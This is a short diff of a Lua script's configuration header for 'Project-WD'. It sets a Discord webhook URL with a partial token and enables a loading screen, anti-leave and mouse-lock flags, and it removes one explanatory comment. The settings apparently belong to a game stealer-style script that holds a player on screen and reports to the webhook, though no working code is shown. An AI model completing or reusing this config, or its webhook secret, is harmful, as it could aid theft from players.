@@ -4,7 +4,6 @@ Webhook = "https://discord.com/api/webhooks/1108363524129951764/GMv43esiWeeC_9-w
 _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true 
--- set them to false if you don't need them
 
 _G.ScriptName = "Project-WD"
 _G.FirstText = "Script Preparing"
